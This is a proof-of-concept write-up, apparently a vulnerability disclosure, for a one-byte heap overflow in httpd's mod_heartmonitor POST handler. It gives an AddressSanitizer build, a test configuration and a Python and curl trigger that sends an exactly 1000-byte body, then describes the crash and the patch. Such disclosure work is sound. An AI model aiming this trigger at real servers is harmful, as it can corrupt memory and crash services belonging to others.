# PoC 060 - Out-of-Bounds Terminator Write in Heartbeat POST Handler

`mod_heartmonitor`'s HTTP POST handler allocates `MAX_MSG_LEN` (1000) bytes,
reads up to 1000 bytes, then writes `buf[len] = '\0'` - a one-byte write past
the end of the allocation when the body is exactly 1000 bytes.

## Setup

Vulnerable httpd 2.4.66 with `mod_heartmonitor` (or its symmetric POST handler
shipping with `mod_heartbeat` listener-mode setups). Build httpd with the
debug allocator or AddressSanitizer to surface the out-of-bounds write
deterministically:

```
CFLAGS="-fsanitize=address -g -O1" ./configure \
    --enable-heartmonitor --enable-watchdog \
    --prefix=/tmp/httpd-asan
make -j && make install
```

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule watchdog_module     modules/mod_watchdog.so
LoadModule heartmonitor_module modules/mod_heartmonitor.so
HeartbeatListen 127.0.0.1:27999
HeartbeatMaxServers 10
HeartbeatStorage logs/hb.dat

<Location /HeartbeatAccept>
    SetHandler heartbeat
    Require all granted
</Location>
```

## Trigger

Send a heartbeat POST whose body is exactly `MAX_MSG_LEN` (1000) bytes. Use a
valid-looking key=value form so `qs_to_table` is happy and execution reaches
`buf[len] = '\0'`:

```
python3 -c '
import sys
body = b"v=1&busy=0&ready=1&"
body += b"x" * (1000 - len(body))   # pad to exactly 1000 bytes
sys.stdout.buffer.write(body)
' > /tmp/hb1000.bin

wc -c /tmp/hb1000.bin   # -> 1000

curl -sS -X POST --data-binary @/tmp/hb1000.bin \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    http://127.0.0.1:8080/HeartbeatAccept
```

## Observed effect

Under ASan, the request triggers a `heap-buffer-overflow WRITE of size 1` in
`hm_handler` at the `buf[len] = '\0'` statement, with the allocation reported
as `apr_pcalloc` of size 1000 from `modules/cluster/mod_heartmonitor.c:763`.
Without ASan, the OOB write silently corrupts the next pool allocation
header; this is observable as occasional pool corruption assertions in
`error_log` (`APR_POOL_DEBUG` builds) or as crashes in subsequent requests
sharing the same pool. With the patch applied the allocation becomes
`MAX_MSG_LEN + 1` and the write lands inside the buffer.
